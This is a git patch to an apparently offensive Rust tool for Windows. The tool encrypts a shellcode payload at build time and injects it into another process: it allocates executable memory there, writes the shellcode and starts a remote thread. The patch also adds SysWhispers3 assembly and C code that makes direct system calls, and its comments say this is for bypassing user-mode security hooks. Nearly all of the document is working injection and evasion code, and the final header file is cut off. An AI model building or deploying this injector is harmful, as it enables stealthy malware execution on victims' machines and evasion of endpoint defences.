@@ -1,0 +1,950 @@
+From ee535ad6bbe0eee2f042e506b052879559d72044 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Wed, 21 Oct 2026 04:37:31 +0700
+Subject: [PATCH 05/10] gunakan syswhispers3
+
+---
+ inject/Cargo.toml                        |   4 +
+ inject/build.rs                          |  94 +++++---
+ inject/src/main.rs                       |  74 +++---
+ inject/src/syscalls.rs                   |  72 ++++++
+ inject/syswhispers/swdefault-asm.x64.asm | 113 +++++++++
+ inject/syswhispers/swdefault.c           | 278 +++++++++++++++++++++++
+ inject/syswhispers/swdefault.h           | 164 +++++++++++++
+ 7 files changed, 725 insertions(+), 74 deletions(-)
+ create mode 100644 inject/src/syscalls.rs
+ create mode 100644 inject/syswhispers/swdefault-asm.x64.asm
+ create mode 100644 inject/syswhispers/swdefault.c
+ create mode 100644 inject/syswhispers/swdefault.h
+
+diff --git a/inject/Cargo.toml b/inject/Cargo.toml
+index 76dd9bf..e9f3d11 100644
+--- a/inject/Cargo.toml
++++ b/inject/Cargo.toml
+@@ -16,6 +16,7 @@ base64 = "0.22.1"
+ ntapi = "0.4.1"
+ 
+ [build-dependencies]
++cc = "1.0"
+ chacha20poly1305 = "0.10.1"
+ rand = "0.8.5"
+ rand_core = "0.6.4"
+@@ -47,3 +48,6 @@ features = [
+     "Win32_Networking_ActiveDirectory",
+     "Win32_Security_Authentication_Identity"
+ ]
++
++[target.'cfg(windows)'.dependencies]
++winapi = { version = "0.3", features = ["debugapi", "memoryapi", "processthreadsapi"] }
+diff --git a/inject/build.rs b/inject/build.rs
+index 7ffab94..f4c8f71 100644
+--- a/inject/build.rs
++++ b/inject/build.rs
+@@ -1,65 +1,85 @@
+ use chacha20poly1305::{
+-    aead::{Aead, KeyInit}, 
+-    ChaCha20Poly1305, Key, Nonce, 
++    aead::{Aead, KeyInit},
++    ChaCha20Poly1305, Key, Nonce,
+ };
+-use rand::RngCore; 
+-use rand::rngs::OsRng; 
+-use std::env; 
+-use std::fs; 
+-use std::io::Write; 
+-use std::path::Path; 
++use rand::RngCore;
++use rand::rngs::OsRng;
++use std::env;
++use std::fs;
++use std::io::Write;
++use std::path::{Path, PathBuf};
++use std::process::Command;
+ 
+-use base64::engine::Engine as _; 
+-use base64::engine::general_purpose::STANDARD; 
++// BASE64 ENGINE IMPORTS
++use base64::engine::Engine as _;
++use base64::engine::general_purpose::STANDARD;
+ 
+ fn main() {
+-    println!("cargo:warning=--- Injector BUILD.RS STARTED ---"); 
++    // --- 1. Payload Generation (Restored) ---
++    println!("cargo:rerun-if-changed=payload.bin");
+     
+-    let payload_path = Path::new("payload.bin"); 
+-    
+-    // Create dummy payload if it doesn't exist to allow compilation
+-    if !payload_path.exists() {
+-        println!("cargo:warning=payload.bin not found, creating dummy.");
+-        fs::write(payload_path, b"\x90\x90\x90\x90").unwrap(); // NOPs
+-    }
+-    
+-    println!("cargo:rerun-if-changed={}", payload_path.display()); 
+-
++    let payload_path = Path::new("payload.bin");
+     let shellcode = fs::read(payload_path)
+-        .expect("Error: payload.bin could not be read.");
+-        
+-    println!("cargo:warning=Shellcode read successfully, size: {} bytes", shellcode.len()); 
++        .expect("Error: payload.bin not found. Ensure it exists in the project root.");
+     
+     let mut rng = OsRng::default();
+-
+     let mut key_bytes = [0u8; 32];
+-    RngCore::fill_bytes(&mut rng, &mut key_bytes); 
+-    let key = Key::from_slice(&key_bytes); 
++    RngCore::fill_bytes(&mut rng, &mut key_bytes);
++    let key = Key::from_slice(&key_bytes);
+ 
+     let mut nonce_bytes = [0u8; 12];
+-    RngCore::fill_bytes(&mut rng, &mut nonce_bytes); 
++    RngCore::fill_bytes(&mut rng, &mut nonce_bytes);
+     let nonce = Nonce::from_slice(&nonce_bytes);
+ 
+-    let cipher = ChaCha20Poly1305::new(key); 
+-    let ciphertext_vec = cipher 
++    let cipher = ChaCha20Poly1305::new(key);
++    let ciphertext_vec = cipher
+         .encrypt(nonce, shellcode.as_ref())
+         .expect("Payload encryption failed!");
+ 
+-    let ciphertext_base64 = STANDARD.encode(ciphertext_vec); 
+-    
+-    let out_dir = env::var("OUT_DIR").unwrap();
+-    let dest_path = Path::new(&out_dir).join("payload_data.rs"); 
++    let ciphertext_base64 = STANDARD.encode(ciphertext_vec);
+ 
++    let out_dir = env::var("OUT_DIR").unwrap();
++    let dest_path = Path::new(&out_dir).join("payload_data.rs");
+     let mut file = fs::File::create(&dest_path).expect("Could not create payload_data.rs file");
+     
+     writeln!(
+         file,
+-        "pub const ENCRYPTED_PAYLOAD_BASE64: &str = \"{}\";", 
++        "pub const ENCRYPTED_PAYLOAD_BASE64: &str = \"{}\";",
+         ciphertext_base64
+-    ).unwrap(); 
++    ).unwrap();
+     writeln!(file, "pub const PAYLOAD_KEY: [u8; 32] = {:?};", key_bytes).unwrap();
+     writeln!(file, "pub const PAYLOAD_NONCE: [u8; 12] = {:?};", nonce_bytes).unwrap();
+     
+     println!("cargo:warning=--- Injector: Shellcode successfully encrypted in {}", dest_path.display());
+-    println!("cargo:warning=--- Injector BUILD.RS FINISHED ---");
++
++    // --- 2. SysWhispers3 Compilation (Retained) ---
++    println!("cargo:rerun-if-changed=syswhispers/swdefault.c");
++    println!("cargo:rerun-if-changed=syswhispers/swdefault.h");
++    println!("cargo:rerun-if-changed=syswhispers/swdefault-asm.x64.asm");
++
++    cc::Build::new()
++        .file("syswhispers/swdefault.c")
++        .compile("syscalls");
++
++    let asm_obj = PathBuf::from(&out_dir).join("swdefault-asm.x64.obj");
++
++    let llvm_prefix = std::env::var("LLVM_PREFIX")
++        .unwrap_or_else(|_| "/opt/homebrew/opt/llvm".to_string());
++
++    let llvm_ml = PathBuf::from(llvm_prefix).join("bin/llvm-ml");
++
++    let status = Command::new(&llvm_ml)
++        .args([
++            "-m64",
++            "-c",
++            "syswhispers/swdefault-asm.x64.asm",
++            "-Fo",
++        ])
++        .arg(&asm_obj)
++        .status()
++        .expect("failed to execute llvm-ml");
++
++    assert!(status.success(), "llvm-ml failed");
++
++    println!("cargo:rustc-link-arg={}", asm_obj.display());
+ }
+diff --git a/inject/src/main.rs b/inject/src/main.rs
+index b1b3f31..f4ae04c 100644
+--- a/inject/src/main.rs
++++ b/inject/src/main.rs
+@@ -2,30 +2,18 @@ use std::{ptr::null_mut, mem::size_of, process};
+ use clap::Parser;
+ mod evasion;
+ mod crypto;
++mod syscalls;
+ 
+ use windows_sys::Win32::{
+-    Foundation::{CloseHandle, INVALID_HANDLE_VALUE, NTSTATUS},
++    Foundation::INVALID_HANDLE_VALUE,
+     System::{
+         Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next},
+-        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+-        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
++        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
++        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
+     },
+ };
+-
+-#[link(name = "ntdll")]
+-extern "system" {
+-    fn NtWriteVirtualMemory(
+-        ProcessHandle: isize,
+-        BaseAddress: *mut std::ffi::c_void,
+-        Buffer: *const std::ffi::c_void,
+-        NumberOfBytesToWrite: usize,
+-        NumberOfBytesWritten: *mut usize,
+-    ) -> NTSTATUS;
+-}
+-
+-fn nt_success(status: NTSTATUS) -> bool {
+-    status >= 0
+-}
++use syscalls::*;
++use ntapi::winapi::shared::ntdef::NT_SUCCESS;
+ 
+ include!(concat!(env!("OUT_DIR"), "/payload_data.rs"));
+ 
+@@ -64,12 +52,15 @@ fn main() {
+     println!("[+] Process handle: {:?}", process_handle);
+ 
+     // Allocate memory in the target process for the shellcode
+-    let shellcode_address = unsafe {
+-        VirtualAllocEx(
+-            process_handle,
+-            null_mut(),
+-            shellcode_bytes.len(),
+-            MEM_COMMIT | MEM_RESERVE,
++    let mut shellcode_address: *mut std::ffi::c_void = null_mut();
++    let mut region_size = shellcode_bytes.len();
++    let status = unsafe {
++        Sw3NtAllocateVirtualMemory(
++            process_handle as _,
++            std::ptr::addr_of_mut!(shellcode_address),
++            0,
++            &mut region_size,
++            (MEM_COMMIT | MEM_RESERVE) as u32,
+             PAGE_EXECUTE_READWRITE,
+         )
+     };
+@@ -79,13 +70,13 @@ fn main() {
+         shellcode_address
+     );
+ 
+-    if shellcode_address.is_null() {
+-        panic!("Failed to allocate memory in the target process for the shellcode");
++    if !NT_SUCCESS(status) {
++        panic!("Failed to allocate memory in the target process for the shellcode. Status: {:#X}", status);
+     }
+ 
+     // Write the shellcode to the target process
+     let status = unsafe {
+-        NtWriteVirtualMemory(
++        Sw3NtWriteVirtualMemory(
+             process_handle as _,
+             shellcode_address as _,
+             shellcode_bytes.as_ptr() as _,
+@@ -94,7 +85,7 @@ fn main() {
+         )
+     };
+ 
+-    if !nt_success(status) {
++    if !NT_SUCCESS(status) {
+         panic!("Failed to write the image to the target process. Status: {:#X}", status);
+     }
+ 
+@@ -102,22 +93,31 @@ fn main() {
+     //pause();
+ 
+     // Create remote thread and execute our shellcode
+-    let thread_handle = unsafe {
+-        CreateRemoteThread(
+-            process_handle,
+-            null_mut(),
+-            0,
+-            Some(std::mem::transmute(shellcode_address as usize)),
++    let mut thread_handle: ntapi::winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
++    let status = unsafe {
++        Sw3NtCreateThreadEx(
++            &mut thread_handle,
++            0x1FFFFF, // THREAD_ALL_ACCESS
++            std::ptr::null_mut(),
++            process_handle as *mut _,
++            shellcode_address as *mut _,
+             std::ptr::null_mut(),
+             0,
+-            null_mut(),
++            0,
++            0,
++            0,
++            std::ptr::null_mut(),
+         )
+     };
+ 
++    if !NT_SUCCESS(status) {
++        panic!("Failed to create remote thread. Status: {:#X}", status);
++    }
++
+     // Close thread and process handle
+     unsafe {
+-        CloseHandle(thread_handle);
+-        CloseHandle(process_handle);
++        Sw3NtClose(thread_handle);
++        Sw3NtClose(process_handle as *mut _);
+     };
+ }
+ 
+diff --git a/inject/src/syscalls.rs b/inject/src/syscalls.rs
+new file mode 100644
+index 0000000..d2ee335
+--- /dev/null
++++ b/inject/src/syscalls.rs
+@@ -0,0 +1,72 @@
++use winapi::ctypes::c_void;
++use ntapi::winapi::shared::ntdef::{HANDLE, NTSTATUS};
++use ntapi::ntpsapi::PPS_ATTRIBUTE_LIST;
++use ntapi::winapi::shared::ntdef::OBJECT_ATTRIBUTES;
++
++#[allow(non_camel_case_types)]
++pub type PobjectAttributes = *mut OBJECT_ATTRIBUTES;
++#[allow(non_camel_case_types)]
++pub type PsizeT = *mut usize;
++#[allow(non_camel_case_types)]
++pub type AccessMask = u32;
++
++#[allow(dead_code)]
++#[repr(C)]
++pub enum PROCESSINFOCLASS {
++    ProcessDebugPort = 7,
++}
++
++unsafe extern "system" {
++    pub fn Sw3NtCreateThreadEx(
++        ThreadHandle: *mut HANDLE,
++        DesiredAccess: AccessMask,
++        ObjectAttributes: PobjectAttributes,
++        ProcessHandle: HANDLE,
++        StartRoutine: *mut c_void,
++        Argument: *mut c_void,
++        CreateFlags: u32,
++        ZeroBits: usize,
++        StackSize: usize,
++        MaximumStackSize: usize,
++        AttributeList: *mut PPS_ATTRIBUTE_LIST,
++    ) -> NTSTATUS;
++
++    pub fn Sw3NtAllocateVirtualMemory(
++        ProcessHandle: HANDLE,
++        BaseAddress: *mut *mut c_void,
++        ZeroBits: usize,
++        RegionSize: PsizeT,
++        AllocationType: u32,
++        Protect: u32,
++    ) -> NTSTATUS;
++
++    pub fn Sw3NtWriteVirtualMemory(
++        ProcessHandle: HANDLE,
++        BaseAddress: *mut c_void,
++        Buffer: *const c_void,
++        NumberOfBytesToWrite: usize,
++        NumberOfBytesWritten: *mut usize,
++    ) -> NTSTATUS;
++
++    #[allow(dead_code)]
++    pub fn Sw3NtProtectVirtualMemory(
++        ProcessHandle: HANDLE,
++        BaseAddress: *mut *mut c_void,
++        RegionSize: PsizeT,
++        NewProtect: u32,
++        OldProtect: *mut u32,
++    ) -> NTSTATUS;
++
++    pub fn Sw3NtClose(
++        Handle: HANDLE,
++    ) -> NTSTATUS;
++
++    #[allow(dead_code)]
++    pub fn Sw3NtQueryInformationProcess(
++        ProcessHandle: HANDLE,
++        ProcessInformationClass: PROCESSINFOCLASS,
++        ProcessInformation: *mut c_void,
++        ProcessInformationLength: u32,
++        ReturnLength: *mut u32,
++    ) -> NTSTATUS;
++}
+diff --git a/inject/syswhispers/swdefault-asm.x64.asm b/inject/syswhispers/swdefault-asm.x64.asm
+new file mode 100644
+index 0000000..58f90ab
+--- /dev/null
++++ b/inject/syswhispers/swdefault-asm.x64.asm
+@@ -0,0 +1,113 @@
++.code
++
++EXTERN SW3_GetSyscallNumber: PROC
++
++Sw3NtCreateThreadEx PROC
++	mov [rsp +8], rcx          ; Save registers.
++	mov [rsp+16], rdx
++	mov [rsp+24], r8
++	mov [rsp+32], r9
++	sub rsp, 28h
++	mov ecx, 0ED32D98Eh        ; Load function hash into ECX.
++	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
++	add rsp, 28h
++	mov rcx, [rsp+8]                      ; Restore registers.
++	mov rdx, [rsp+16]
++	mov r8, [rsp+24]
++	mov r9, [rsp+32]
++	mov r10, rcx
++	syscall                    ; Invoke system call.
++	ret
++Sw3NtCreateThreadEx ENDP
++
++Sw3NtAllocateVirtualMemory PROC
++	mov [rsp +8], rcx          ; Save registers.
++	mov [rsp+16], rdx
++	mov [rsp+24], r8
++	mov [rsp+32], r9
++	sub rsp, 28h
++	mov ecx, 01DDD6B33h        ; Load function hash into ECX.
++	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
++	add rsp, 28h
++	mov rcx, [rsp+8]                      ; Restore registers.
++	mov rdx, [rsp+16]
++	mov r8, [rsp+24]
++	mov r9, [rsp+32]
++	mov r10, rcx
++	syscall                    ; Invoke system call.
++	ret
++Sw3NtAllocateVirtualMemory ENDP
++
++Sw3NtWriteVirtualMemory PROC
++	mov [rsp +8], rcx          ; Save registers.
++	mov [rsp+16], rdx
++	mov [rsp+24], r8
++	mov [rsp+32], r9
++	sub rsp, 28h
++	mov ecx, 08590971Bh        ; Load function hash into ECX.
++	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
++	add rsp, 28h
++	mov rcx, [rsp+8]                      ; Restore registers.
++	mov rdx, [rsp+16]
++	mov r8, [rsp+24]
++	mov r9, [rsp+32]
++	mov r10, rcx
++	syscall                    ; Invoke system call.
++	ret
++Sw3NtWriteVirtualMemory ENDP
++
++Sw3NtProtectVirtualMemory PROC
++	mov [rsp +8], rcx          ; Save registers.
++	mov [rsp+16], rdx
++	mov [rsp+24], r8
++	mov [rsp+32], r9
++	sub rsp, 28h
++	mov ecx, 0CBD9029Ah        ; Load function hash into ECX.
++	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
++	add rsp, 28h
++	mov rcx, [rsp+8]                      ; Restore registers.
++	mov rdx, [rsp+16]
++	mov r8, [rsp+24]
++	mov r9, [rsp+32]
++	mov r10, rcx
++	syscall                    ; Invoke system call.
++	ret
++Sw3NtProtectVirtualMemory ENDP
++
++Sw3NtClose PROC
++	mov [rsp +8], rcx          ; Save registers.
++	mov [rsp+16], rdx
++	mov [rsp+24], r8
++	mov [rsp+32], r9
++	sub rsp, 28h
++	mov ecx, 044942559h        ; Load function hash into ECX.
++	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
++	add rsp, 28h
++	mov rcx, [rsp+8]                      ; Restore registers.
++	mov rdx, [rsp+16]
++	mov r8, [rsp+24]
++	mov r9, [rsp+32]
++	mov r10, rcx
++	syscall                    ; Invoke system call.
++	ret
++Sw3NtClose ENDP
++
++Sw3NtQueryInformationProcess PROC
++	mov [rsp +8], rcx          ; Save registers.
++	mov [rsp+16], rdx
++	mov [rsp+24], r8
++	mov [rsp+32], r9
++	sub rsp, 28h
++	mov ecx, 0061EE103h        ; Load function hash into ECX.
++	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
++	add rsp, 28h
++	mov rcx, [rsp+8]                      ; Restore registers.
++	mov rdx, [rsp+16]
++	mov r8, [rsp+24]
++	mov r9, [rsp+32]
++	mov r10, rcx
++	syscall                    ; Invoke system call.
++	ret
++Sw3NtQueryInformationProcess ENDP
++
++end
+\ No newline at end of file
+diff --git a/inject/syswhispers/swdefault.c b/inject/syswhispers/swdefault.c
+new file mode 100644
+index 0000000..a261d8e
+--- /dev/null
++++ b/inject/syswhispers/swdefault.c
+@@ -0,0 +1,278 @@
++#include "swdefault.h"
++#include <stdio.h>
++
++//#define DEBUG
++
++// JUMPER
++
++#ifdef _M_IX86
++
++EXTERN_C PVOID internal_cleancall_wow64_gate(VOID) {
++    return (PVOID)__readfsdword(0xC0);
++}
++
++__declspec(naked) BOOL local_is_wow64(void)
++{
++    __asm {
++        mov eax, fs:[0xc0]
++        test eax, eax
++        jne wow64
++        mov eax, 0
++        ret
++        wow64:
++        mov eax, 1
++        ret
++    }
++}
++
++
++#endif
++
++// Code below is adapted from @modexpblog. Read linked article for more details.
++// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams
++
++SW3_SYSCALL_LIST SW3_SyscallList;
++
++// SEARCH_AND_REPLACE
++#ifdef SEARCH_AND_REPLACE
++// THIS IS NOT DEFINED HERE; don't know if I'll add it in a future release
++EXTERN void SearchAndReplace(unsigned char[], unsigned char[]);
++#endif
++
++DWORD SW3_HashSyscall(PCSTR FunctionName)
++{
++    DWORD i = 0;
++    DWORD Hash = SW3_SEED;
++
++    while (FunctionName[i])
++    {
++        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
++        Hash ^= PartialName + SW3_ROR8(Hash);
++    }
++
++    return Hash;
++}
++
++#ifndef JUMPER
++PVOID SC_Address(PVOID NtApiAddress)
++{
++    return NULL;
++}
++#else
++PVOID SC_Address(PVOID NtApiAddress)
++{
++    DWORD searchLimit = 512;
++    PVOID SyscallAddress;
++
++   #ifdef _WIN64
++    // If the process is 64-bit on a 64-bit OS, we need to search for syscall
++    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
++    ULONG distance_to_syscall = 0x12;
++   #else
++    // If the process is 32-bit on a 32-bit OS, we need to search for sysenter
++    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
++    ULONG distance_to_syscall = 0x0f;
++   #endif
++
++  #ifdef _M_IX86
++    // If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
++    if (local_is_wow64())
++    {
++    #ifdef DEBUG
++        printf("[+] Running 32-bit app on x64 (WOW64)\n");
++    #endif
++        return NULL;
++    }
++  #endif
++
++    // we don't really care if there is a 'jmp' between
++    // NtApiAddress and the 'syscall; ret' instructions
++    SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
++
++    if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
++    {
++        // we can use the original code for this system call :)
++        #if defined(DEBUG)
++            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
++        #endif
++        return SyscallAddress;
++    }
++
++    // the 'syscall; ret' intructions have not been found,
++    // we will try to use one near it, similarly to HalosGate
++
++    for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
++    {
++        // let's try with an Nt* API below our syscall
++        SyscallAddress = SW3_RVA2VA(
++            PVOID,
++            NtApiAddress,
++            distance_to_syscall + num_jumps * 0x20);
++        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
++        {
++        #if defined(DEBUG)
++            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
++        #endif
++            return SyscallAddress;
++        }
++
++        // let's try with an Nt* API above our syscall
++        SyscallAddress = SW3_RVA2VA(
++            PVOID,
++            NtApiAddress,
++            distance_to_syscall - num_jumps * 0x20);
++        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
++        {
++        #if defined(DEBUG)
++            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
++        #endif
++            return SyscallAddress;
++        }
++    }
++
++#ifdef DEBUG
++    printf("Syscall Opcodes not found!\n");
++#endif
++
++    return NULL;
++}
++#endif
++
++
++BOOL SW3_PopulateSyscallList()
++{
++    // Return early if the list is already populated.
++    if (SW3_SyscallList.Count) return TRUE;
++
++    #ifdef _WIN64
++    PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
++    #else
++    PSW3_PEB Peb = (PSW3_PEB)__readfsdword(0x30);
++    #endif
++    PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
++    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
++    PVOID DllBase = NULL;
++
++    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
++    // in the list, so it's safer to loop through the full list and find it.
++    PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
++    for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
++    {
++        DllBase = LdrEntry->DllBase;
++        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
++        PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
++        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
++        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
++        if (VirtualAddress == 0) continue;
++
++        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
++
++        // If this is NTDLL.dll, exit loop.
++        PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
++
++        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
++        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
++    }
++
++    if (!ExportDirectory) return FALSE;
++
++    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
++    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
++    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
++    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
++
++    // Populate SW3_SyscallList with unsorted Zw* entries.
++    DWORD i = 0;
++    PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
++    do
++    {
++        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
++
++        // Is this a system call?
++        if (*(USHORT*)FunctionName == 0x775a)
++        {
++            Entries[i].Hash = SW3_HashSyscall(FunctionName);
++            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
++            Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));
++
++            i++;
++            if (i == SW3_MAX_ENTRIES) break;
++        }
++    } while (--NumberOfNames);
++
++    // Save total number of system calls found.
++    SW3_SyscallList.Count = i;
++
++    // Sort the list by address in ascending order.
++    for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
++    {
++        for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
++        {
++            if (Entries[j].Address > Entries[j + 1].Address)
++            {
++                // Swap entries.
++                SW3_SYSCALL_ENTRY TempEntry;
++
++                TempEntry.Hash = Entries[j].Hash;
++                TempEntry.Address = Entries[j].Address;
++                TempEntry.SyscallAddress = Entries[j].SyscallAddress;
++
++                Entries[j].Hash = Entries[j + 1].Hash;
++                Entries[j].Address = Entries[j + 1].Address;
++                Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;
++
++                Entries[j + 1].Hash = TempEntry.Hash;
++                Entries[j + 1].Address = TempEntry.Address;
++                Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
++            }
++        }
++    }
++
++    return TRUE;
++}
++
++EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
++{
++    // Ensure SW3_SyscallList is populated.
++    if (!SW3_PopulateSyscallList()) return -1;
++
++    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
++    {
++        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
++        {
++            return i;
++        }
++    }
++
++    return -1;
++}
++
++EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
++{
++    // Ensure SW3_SyscallList is populated.
++    if (!SW3_PopulateSyscallList()) return NULL;
++
++    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
++    {
++        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
++        {
++            return SW3_SyscallList.Entries[i].SyscallAddress;
++        }
++    }
++
++    return NULL;
++}
++
++EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
++{
++    // Ensure SW3_SyscallList is populated.
++    if (!SW3_PopulateSyscallList()) return NULL;
++
++    DWORD index = ((DWORD) rand()) % SW3_SyscallList.Count;
++
++    while (FunctionHash == SW3_SyscallList.Entries[index].Hash){
++        // Spoofing the syscall return address
++        index = ((DWORD) rand()) % SW3_SyscallList.Count;
++    }
++    return SW3_SyscallList.Entries[index].SyscallAddress;
++}
+diff --git a/inject/syswhispers/swdefault.h b/inject/syswhispers/swdefault.h
+new file mode 100644
+index 0000000..709afdc
+--- /dev/null
++++ b/inject/syswhispers/swdefault.h
+@@ -0,0 +1,164 @@
++#pragma once
++
++// Code below is adapted from @modexpblog. Read linked article for more details.
++// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams
++
++#ifndef SW3_HEADER_H_
++#define SW3_HEADER_H_
++
++#include <windows.h>
++
++#ifndef _NTDEF_
++typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
++typedef NTSTATUS* PNTSTATUS;
++#endif
++
++#define SW3_SEED 0xA3B8AA05
++#define SW3_ROL8(v) (v << 8 | v >> 24)
++#define SW3_ROR8(v) (v >> 8 | v << 24)
++#define SW3_ROX8(v) ((SW3_SEED % 2) ? SW3_ROL8(v) : SW3_ROR8(v))
++#define SW3_MAX_ENTRIES 600
++#define SW3_RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)
++
++// Typedefs are prefixed to avoid pollution.
++
++typedef struct _SW3_SYSCALL_ENTRY
++{
++    DWORD Hash;
++    DWORD Address;
++	PVOID SyscallAddress;
++} SW3_SYSCALL_ENTRY, *PSW3_SYSCALL_ENTRY;
++
++typedef struct _SW3_SYSCALL_LIST
++{
++    DWORD Count;
++    SW3_SYSCALL_ENTRY Entries[SW3_MAX_ENTRIES];
++} SW3_SYSCALL_LIST, *PSW3_SYSCALL_LIST;
++
++typedef struct _SW3_PEB_LDR_DATA {
++	BYTE Reserved1[8];
++	PVOID Reserved2[3];
++	LIST_ENTRY InMemoryOrderModuleList;
++} SW3_PEB_LDR_DATA, *PSW3_PEB_LDR_DATA;
++
++typedef struct _SW3_LDR_DATA_TABLE_ENTRY {
++	PVOID Reserved1[2];
++	LIST_ENTRY InMemoryOrderLinks;
++	PVOID Reserved2[2];
++	PVOID DllBase;
++} SW3_LDR_DATA_TABLE_ENTRY, *PSW3_LDR_DATA_TABLE_ENTRY;
++
++typedef struct _SW3_PEB {
++	BYTE Reserved1[2];
++	BYTE BeingDebugged;
++	BYTE Reserved2[1];
++	PVOID Reserved3[2];
++	PSW3_PEB_LDR_DATA Ldr;
++} SW3_PEB, *PSW3_PEB;
++
++DWORD SW3_HashSyscall(PCSTR FunctionName);
++BOOL SW3_PopulateSyscallList();
++EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash);
++EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
++EXTERN_C PVOID internal_cleancall_wow64_gate(VOID);
++#ifndef InitializeObjectAttributes
++#define InitializeObjectAttributes( p, n, a, r, s ) { \
++	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
++	(p)->RootDirectory = r;                           \
++	(p)->Attributes = a;                              \
++	(p)->ObjectName = n;                              \
++	(p)->SecurityDescriptor = s;                      \
++	(p)->SecurityQualityOfService = NULL;             \
++}
++#endif
++
++typedef struct _UNICODE_STRING
++{
++	USHORT Length;
++	USHORT MaximumLength;
++	PWSTR  Buffer;
++} UNICODE_STRING, *PUNICODE_STRING;
++
++typedef struct _PS_ATTRIBUTE
++{
++	ULONG  Attribute;
++	SIZE_T Size;
++	union
++	{
++		ULONG Value;
++		PVOID ValuePtr;
++	} u1;
++	PSIZE_T ReturnLength;
++} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
++
++typedef struct _OBJECT_ATTRIBUTES
++{
++	ULONG           Length;
++	HANDLE          RootDirectory;
++	PUNICODE_STRING ObjectName;
++	ULONG           Attributes;
++	PVOID           SecurityDescriptor;
++	PVOID           SecurityQualityOfService;
++} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
++
++typedef struct _PS_ATTRIBUTE_LIST
++{
++	SIZE_T       TotalLength;
++	PS_ATTRIBUTE Attributes[1];
++} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
++
++typedef enum _PROCESSINFOCLASS
++{
++	ProcessBasicInformation = 0,
++	ProcessDebugPort = 7,
++	ProcessWow64Information = 26,
